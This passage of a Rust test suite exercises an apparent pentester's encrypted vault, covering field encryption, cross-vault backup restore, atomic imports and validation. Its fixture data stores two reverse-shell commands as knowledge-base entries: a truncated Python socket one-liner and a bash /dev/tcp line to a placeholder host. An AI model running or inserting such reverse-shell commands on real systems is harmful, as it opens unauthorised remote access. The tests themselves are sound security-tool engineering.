            conn.execute("INSERT INTO credentials (id, service, username, password_encrypted, url, notes, totp_secret) VALUES (?1,?2,?3,?4,?5,?6,?7)",
                rusqlite::params!["id3", "gitlab.com", enc("ci-bot"), enc("gl-token-2024"), enc("https://gitlab.com"), enc(""), enc("JBSWY3DPEHPK3PXP")]).unwrap();

            // Project
            conn.execute("INSERT INTO projects (id, name, description, target, methodology) VALUES (?1,?2,?3,?4,?5)",
                rusqlite::params!["p1", "Home Lab Recon", enc("Initial passive reconnaissance of internal lab network."), enc("192.168.1.0/24"), enc("OSSTMM v3 — information gathering phase")]).unwrap();

            // Journal entry
            conn.execute("INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["e1", "p1", enc("Nmap scan: open ports discovered"), enc("Found port 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL) open.\nMySQL 5.7 — check CVE-2023-XXXX."), "recon", "medium"]).unwrap();

            // KB entry
            conn.execute("INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1,?2,?3,?4,?5,?6)",
                rusqlite::params!["k1", enc("Python reverse shell"), enc("python3 -c 'import socket,subprocess,os;...'"), enc("Standard Python reverse shell for Linux/macOS."), enc("reverse-shell,python,linux"), "exploitation"]).unwrap();
        }

        // 3. Re-open DB — verify decrypted data is correct
        {
            let conn = rusqlite::Connection::open(&path).unwrap();

            let creds: Vec<(String, String, String, String, String)> = conn
                .prepare("SELECT service, username, password_encrypted, url, notes FROM credentials ORDER BY service").unwrap()
                .query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?))).unwrap()
                .collect::<Result<Vec<_>,_>>().unwrap();

            let dec = |v: &str| vault::decrypt_to_string(&dek, v).unwrap();

            assert_eq!(creds.len(), 3);
            let gh = creds.iter().find(|c| c.0 == "github.com").unwrap();
            assert_eq!(dec(&gh.1), "dev@example.com");
            assert_eq!(dec(&gh.2), "gh_p@$$w0rd");
            assert_eq!(dec(&gh.3), "https://github.com");
            assert_eq!(dec(&gh.4), "personal GitHub account");

            let aws = creds.iter().find(|c| c.0 == "aws-prod").unwrap();
            assert_eq!(dec(&aws.2), "Xy9#mK!pW2$vL5nR8@jF3*qT7^bN1");
            assert!(dec(&aws.4).contains("DO NOT SHARE"));

            let _gl = creds.iter().find(|c| c.0 == "gitlab.com").unwrap();
            let totp_secret: String = conn.query_row(
                "SELECT totp_secret FROM credentials WHERE service='gitlab.com'", [], |r| r.get(0)
            ).unwrap();
            assert_eq!(dec(&totp_secret), "JBSWY3DPEHPK3PXP");

            let proj: (String, String, String) = conn.query_row(
                "SELECT description, target, methodology FROM projects WHERE name='Home Lab Recon'",
                [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
            ).unwrap();
            assert!(dec(&proj.0).contains("passive reconnaissance"));
            assert_eq!(dec(&proj.1), "192.168.1.0/24");
            assert!(dec(&proj.2).contains("OSSTMM"));

            let entry: (String, String) = conn.query_row(
                "SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))
            ).unwrap();
            assert!(dec(&entry.0).contains("Nmap scan"));
            assert!(dec(&entry.1).contains("CVE-2023"));

            let kb: (String, String, String, String) = conn.query_row(
                "SELECT title, command, description, tags FROM kb_entries LIMIT 1",
                [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))
            ).unwrap();
            assert!(dec(&kb.0).contains("Python reverse shell"));
            assert!(dec(&kb.1).contains("socket"));
            assert!(dec(&kb.3).contains("reverse-shell"));
        }

        // 4. Direct SQLite — prove fields are CIPHERTEXT (base64, not readable)
        {
            let conn = rusqlite::Connection::open(&path).unwrap();
            let is_b64 = |s: &str| s.len() > 20 && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=');

            let u: String = conn.query_row("SELECT username FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&u), "username must be encrypted base64: {}", &u[..30.min(u.len())]);

            let u2: String = conn.query_row("SELECT url FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&u2), "url must be encrypted: {}", &u2[..30.min(u2.len())]);

            let n: String = conn.query_row("SELECT notes FROM credentials WHERE service='github.com'", [], |r| r.get(0)).unwrap();
            assert!(is_b64(&n), "notes must be encrypted");

            let p: (String, String, String) = conn.query_row("SELECT description, target, methodology FROM projects LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap();
            assert!(is_b64(&p.0) && is_b64(&p.1) && is_b64(&p.2), "project fields must be encrypted");

            let e: (String, String) = conn.query_row("SELECT title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
            assert!(is_b64(&e.0) && is_b64(&e.1), "journal fields must be encrypted");

            let k: (String, String, String, String) = conn.query_row("SELECT title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?))).unwrap();
            assert!(is_b64(&k.0) && is_b64(&k.1) && is_b64(&k.2) && is_b64(&k.3), "KB fields must be encrypted");

            // Metadata plaintext
            assert_eq!(conn.query_row("SELECT service FROM credentials LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "github.com");
            assert_eq!(conn.query_row("SELECT name FROM projects LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "Home Lab Recon");
            assert_eq!(conn.query_row("SELECT entry_type FROM journal_entries LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "recon");
            assert_eq!(conn.query_row("SELECT category FROM kb_entries LIMIT 1", [], |r| r.get::<_,String>(0)).unwrap(), "exploitation");
        }

        std::fs::remove_file(&path).ok();
    }

    // ===== Backup portability and atomicity =====

    /// Create a vault with the standard schema and a known, freshly wrapped DEK.
    fn create_test_vault(path: &Path, password: &str) -> [u8; 32] {
        let conn = vault::init_db(path).unwrap();
        journal::init_journal_tables(&conn).unwrap();
        kb::init_kb_tables(&conn).unwrap();
        activity::init_activity_table(&conn).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();

        let dek = vault::generate_dek();
        let mut salt = [0u8; 32];
        crate::util::fill_random(&mut salt);
        let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
        let mut wrapping_key = vault::derive_key(password, &salt).unwrap();
        let wrapped = vault::wrap_dek(&dek, &wrapping_key).unwrap();
        wrapping_key.zeroize();
        let pass_hash = vault::hash_password(password).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();
        conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).unwrap();
        dek
    }

    /// Seed one fully populated credential plus a project, entry and KB row.
    fn seed_vault(conn: &Connection, dek: &[u8; 32]) {
        let enc = |v: &str| vault::encrypt(dek, v).unwrap();
        conn.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes, totp_secret) VALUES (?1,?2,?3,?4,?5,?6,?7)",
            rusqlite::params!["c1", "github.com", enc("dev@example.com"), enc("gh_p@$$w0rd"), enc("https://github.com"), enc("personal account"), enc("JBSWY3DPEHPK3PXP")],
        ).unwrap();
        conn.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["c2", "aws", enc("root@corp.io"), enc("short12chars"), enc("https://aws.amazon.com"), enc("prod")],
        ).unwrap();
        conn.execute(
            "INSERT INTO projects (id, name, description, target, methodology) VALUES (?1,?2,?3,?4,?5)",
            rusqlite::params!["p1", "Home Lab", enc("passive recon"), enc("192.168.1.0/24"), enc("OSSTMM")],
        ).unwrap();
        conn.execute(
            "INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["e1", "p1", enc("found open port"), enc("port 22 open"), "recon", "medium"],
        ).unwrap();
        conn.execute(
            "INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1,?2,?3,?4,?5,?6)",
            rusqlite::params!["k1", enc("reverse shell"), enc("bash -i >& /dev/tcp/host/4444 0>&1"), enc("standard shell"), enc("shell,bash"), "exploitation"],
        ).unwrap();
    }

    #[test]
    fn test_backup_roundtrip_across_vaults() {
        // Regression test for the portability bug: a backup made by one vault
        // must restore into a vault with a different master password, with every
        // field still readable. Previously only the password was decrypted on
        // export, so every other field stayed encrypted under the source key.
        let dir = migration_test_dir("backup-roundtrip");
        let source = dir.join("source.db");
        let destination = dir.join("destination.db");

        let source_dek = create_test_vault(&source, "source-password-123");
        {
            let conn = Connection::open(&source).unwrap();
            seed_vault(&conn, &source_dek);
            bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();

            let backup = backup::collect_all(&conn, &source_dek).unwrap();
            assert_eq!(backup.version, "1.1");
            // Flatten through JSON exactly as the real export path does.
            let json = serde_json::to_string(&backup).unwrap();
            std::fs::write(dir.join("backup.json"), json).unwrap();
        }

        let destination_dek = create_test_vault(&destination, "destination-password-456");
        {
            let json = std::fs::read_to_string(dir.join("backup.json")).unwrap();
            let backup: backup::VaultBackup = serde_json::from_str(&json).unwrap();
            let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();

            let conn = Connection::open(&destination).unwrap();
            conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
            backup::restore_all(&conn, &destination_dek, &prepared).unwrap();
        }

        // Reopen and confirm every field decrypts with the DESTINATION key,
        // through the same read paths the app uses.
        {
            let conn = vault::init_db(&destination).unwrap();
            let key = &destination_dek;

            let list = credentials::list_summaries(&conn, key).unwrap();
            assert_eq!(list.len(), 2, "both credentials must import");
            let github = list.iter().find(|c| c.service == "github.com").expect("names decrypt after import");
            assert_eq!(github.username, "dev@example.com");
            assert!(github.has_totp);
            assert_eq!(credentials::reveal_password(&conn, key, &github.id).unwrap().as_str(), "gh_p@$$w0rd");
            let detail = credentials::detail(&conn, key, &github.id).unwrap();
            assert_eq!(detail.url, "https://github.com");
            assert_eq!(detail.notes, "personal account");
            assert!(credentials::totp_code(&conn, key, &github.id).unwrap().is_some(), "2FA secret must survive");

            // The short password specifically exercises the Base64-padding class
            // of bug that used to break certain ciphertext lengths.
            let aws = list.iter().find(|c| c.service == "aws").unwrap();
            assert_eq!(credentials::reveal_password(&conn, key, &aws.id).unwrap().as_str(), "short12chars");

            let (pid, name, description, target): (String, String, String, String) = conn
                .query_row("SELECT id, name, description, target FROM projects LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)))
                .unwrap();
            let open = |table: &str, id: &str, column: &str, stored: &str| fields::open_to_string(key, table, id, column, stored).unwrap();
            assert_eq!(open("projects", &pid, "name", &name), "Home Lab");
            assert_eq!(open("projects", &pid, "description", &description), "passive recon");
            assert_eq!(open("projects", &pid, "target", &target), "192.168.1.0/24");

            let (eid, title, content): (String, String, String) = conn
                .query_row("SELECT id, title, content FROM journal_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
                .unwrap();
            assert_eq!(open("journal_entries", &eid, "title", &title), "found open port");
            assert_eq!(open("journal_entries", &eid, "content", &content), "port 22 open");

            let (kid, kb_title, kb_command, kb_desc, kb_tags): (String, String, String, String, String) = conn
                .query_row("SELECT id, title, command, description, tags FROM kb_entries LIMIT 1", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)))
                .unwrap();
            assert_eq!(open("kb_entries", &kid, "title", &kb_title), "reverse shell");
            assert_eq!(open("kb_entries", &kid, "command", &kb_command), "bash -i >& /dev/tcp/host/4444 0>&1");
            assert_eq!(open("kb_entries", &kid, "description", &kb_desc), "standard shell");
            assert_eq!(open("kb_entries", &kid, "tags", &kb_tags), "shell,bash");

            // Proof that re-encryption really happened: the source key must not
            // be able to read anything the destination now stores.
            assert!(fields::open(&source_dek, "projects", &pid, "name", &name).is_err(), "source key must not read imported cases");
            assert!(fields::open(&source_dek, "journal_entries", &eid, "title", &title).is_err(), "source key must not read imported journal data");
            assert!(fields::open(&source_dek, "kb_entries", &kid, "title", &kb_title).is_err(), "source key must not read imported commands");
        }

        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_backup_import_is_atomic_on_failure() {
        let dir = migration_test_dir("backup-atomic");
        let source = dir.join("source.db");
        let destination = dir.join("destination.db");

        let source_dek = create_test_vault(&source, "source-password-123");
        let backup = {
            let conn = Connection::open(&source).unwrap();
            seed_vault(&conn, &source_dek);
            bring_up_to_date(&conn, "source-password-123", &source_dek).unwrap();
            backup::collect_all(&conn, &source_dek).unwrap()
        };

        let destination_dek = create_test_vault(&destination, "destination-password-456");
        {
            let conn = Connection::open(&destination).unwrap();
            // Fail the LAST table restore_all touches, after credentials,
            // projects and journal entries have already been inserted.
            conn.execute_batch(
                "CREATE TRIGGER fail_kb_insert BEFORE INSERT ON kb_entries
                 BEGIN SELECT RAISE(ABORT, 'injected failure'); END;",
            ).unwrap();

            let prepared = backup::prepare_for_import(backup, &destination_dek).unwrap();
            let result = backup::restore_all(&conn, &destination_dek, &prepared);
            assert!(result.is_err(), "import must fail when a later insert fails");

            let credentials: i64 = conn.query_row("SELECT COUNT(*) FROM credentials", [], |r| r.get(0)).unwrap();
            assert_eq!(credentials, 0, "a failed import must leave no partial data behind");
            let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
            assert_eq!(projects, 0, "projects must roll back too");
            let entries: i64 = conn.query_row("SELECT COUNT(*) FROM journal_entries", [], |r| r.get(0)).unwrap();
            assert_eq!(entries, 0, "journal entries must roll back too");
        }

        std::fs::remove_dir_all(dir).unwrap();
    }

    fn legacy_v1_backup(source_dek: &[u8; 32]) -> backup::VaultBackup {
        backup::VaultBackup {
            version: "1.0".into(),
            credentials: vec![backup::BackupCredential {
                service: "github.com".into(),
                // A v1.0 export left these as the source vault's ciphertext.
                username: vault::encrypt(source_dek, "dev@example.com").unwrap(),
                password: "plaintext-password".into(),
                url: vault::encrypt(source_dek, "https://github.com").unwrap(),
                notes: vault::encrypt(source_dek, "note").unwrap(),
                totp_secret: None,
                created_at: "2026-01-01".into(),
            }],
            projects: vec![],
            journal_entries: vec![],
            kb_entries: vec![],
        }
    }

    #[test]
    fn test_backup_legacy_payload_is_handled_by_vault_ownership() {
        let source_dek = vault::generate_dek();
        let other_dek = vault::generate_dek();

        // Same vault: the fields really are ciphertext for this key, so the
        // legacy payload still imports rather than being refused.
        assert!(
            backup::prepare_for_import(legacy_v1_backup(&source_dek), &source_dek).is_ok(),
            "a same-vault legacy backup must still be importable"
        );

        // Foreign vault: refuse loudly instead of writing unreadable bytes.
        let error = backup::prepare_for_import(legacy_v1_backup(&source_dek), &other_dek).unwrap_err();
        assert!(error.contains("different vault"), "got: {error}");

        // Unknown future versions are refused rather than guessed at.
        let mut future = legacy_v1_backup(&source_dek);
        future.version = "9.9".into();
        let error = backup::prepare_for_import(future, &source_dek).unwrap_err();
        assert!(error.contains("unsupported backup version"), "got: {error}");
    }

    #[test]
    fn test_backup_prepare_creates_missing_project() {
        let dir = migration_test_dir("backup-missing-project");
        let destination = dir.join("destination.db");
        let dek = create_test_vault(&destination, "destination-password-456");

        let payload = backup::VaultBackup {
            version: "1.1".into(),
            credentials: vec![],
            projects: vec![],
            journal_entries: vec![backup::BackupJournalEntry {
                project_name: "Ghost Engagement".into(),
                title: "orphan entry".into(),
                content: "content".into(),
                entry_type: "note".into(),
                severity: "info".into(),
                created_at: "2026-01-01".into(),
            }],
            kb_entries: vec![],
        };

        let prepared = backup::prepare_for_import(payload, &dek).unwrap();
        let conn = Connection::open(&destination).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
        // Would violate the foreign key if the project were not created first.
        backup::restore_all(&conn, &dek, &prepared).unwrap();

        let projects: i64 = conn.query_row("SELECT COUNT(*) FROM projects", [], |r| r.get(0)).unwrap();
        assert_eq!(projects, 1, "the missing project must be created");
        let (pid, stored_name): (String, String) = conn.query_row(
            "SELECT p.id, p.name FROM journal_entries j JOIN projects p ON j.project_id = p.id",
            [], |r| Ok((r.get(0)?, r.get(1)?)),
        ).unwrap();
        assert_eq!(fields::open_to_string(&dek, "projects", &pid, "name", &stored_name).unwrap(), "Ghost Engagement");

        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn test_bulk_entry_insert_is_atomic_on_failure() {
        // Saving a parsed scan writes many entries at once. One bad row must not
        // leave the engagement holding a subset of the hosts.
        let dir = migration_test_dir("bulk-entries-atomic");
        let path = dir.join("vault.db");
        let dek = create_test_vault(&path, "destination-password-456");

        let conn = Connection::open(&path).unwrap();
        conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();
        conn.execute("INSERT INTO projects (id, name) VALUES ('p1', 'Engagement')", []).unwrap();

        let good = journal::EntryInput {
            project_id: "p1".into(),
            title: "host a".into(),
            content: "22/tcp open".into(),
            entry_type: "recon".into(),
            severity: "info".into(),
        };
        let bad = journal::EntryInput {
            project_id: "does-not-exist".into(),
            title: "host b".into(),
            content: "80/tcp open".into(),
            entry_type: "recon".into(),
            severity: "info".into(),
        };

        let result = insert_entries(&conn, &dek, &[good, bad]);
        assert!(result.is_err(), "a foreign key violation must fail the whole batch");

        let count: i64 = conn.query_row("SELECT COUNT(*) FROM journal_entries", [], |r| r.get(0)).unwrap();
        assert_eq!(count, 0, "no entry may be written when the batch fails");

        std::fs::remove_dir_all(dir).unwrap();
    }

    // ===== Crypto robustness and validation =====

    #[test]
    fn test_unwrap_dek_rejects_wrong_length_instead_of_panicking() {
        use aes_gcm::aead::{Aead, KeyInit};
        use aes_gcm::{Aes256Gcm, Nonce};

        let wrapping_key = [7u8; 32];
        let cipher = Aes256Gcm::new_from_slice(&wrapping_key).unwrap();
        let mut nonce_bytes = [0u8; 12];
        crate::util::fill_random(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        // A 1-byte payload is authentic under the key but is not a 32-byte DEK.
        let ciphertext = cipher.encrypt(nonce, b"x".as_ref()).unwrap();
        let mut combined = nonce_bytes.to_vec();
        combined.extend_from_slice(&ciphertext);
        let encoded = base64::engine::general_purpose::STANDARD.encode(&combined);

        let result = vault::unwrap_dek(&encoded, &wrapping_key);
        let message = result.expect_err("a short wrapped payload must be an error, not a panic");
        assert!(message.contains("corrupted DEK"), "got: {message}");
    }

    #[test]
    fn test_input_validation_rejects_weak_and_oversized_values() {
        assert!(reject_empty_password("", "Password").is_err());
        assert!(require_min_length("too-short", "Password", MIN_MASTER_PASSWORD_CHARS).is_err());
        assert!(require_min_length("long-enough-password", "Password", MIN_MASTER_PASSWORD_CHARS).is_ok());

        let blank_service = CredentialInput {
            service: "   ".into(), username: String::new(), password: String::new(),
            url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&blank_service).is_err(), "blank service must be rejected");

        let oversized = CredentialInput {
            service: "a".repeat(MAX_FIELD_CHARS + 1), username: String::new(),
            password: String::new(), url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&oversized).is_err(), "oversized field must be rejected");

        let valid = CredentialInput {
            service: "github.com".into(), username: "user".into(), password: "pw".into(),
            url: String::new(), notes: String::new(),
        };
        assert!(validate_credential(&valid).is_ok());
    }

    #[test]
    fn test_totp_secret_validation() {
        assert!(totp::validate_secret("").is_err(), "empty secret must be rejected");
        assert!(totp::validate_secret("JBSWY3").is_err(), "a short secret must be rejected");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PXP").is_ok(), "a 16-char base32 secret (80 bits) is acceptable");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PX").is_err(), "a 15-char secret is below the 80-bit floor");
        assert!(totp::validate_secret("JBSWY3DPEHPK3PXP@").is_err(), "invalid characters must be rejected");
        assert!(totp::generate_code("").is_err(), "an empty secret must not produce a code");
    }

    #[test]
    fn test_activity_ids_do_not_collide() {
        let conn = Connection::open_in_memory().unwrap();
        activity::init_activity_table(&conn).unwrap();
        for i in 0..500 {
            activity::log_action(&conn, "test", &format!("entry {i}"));
        }
        let total: i64 = conn.query_row("SELECT COUNT(*) FROM activity_log", [], |r| r.get(0)).unwrap();
        assert_eq!(total, 500, "every audit entry must survive");
    }

    fn sha256_hash(input: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(input.as_bytes());
        format!("{:x}", hasher.finalize())
    }
}
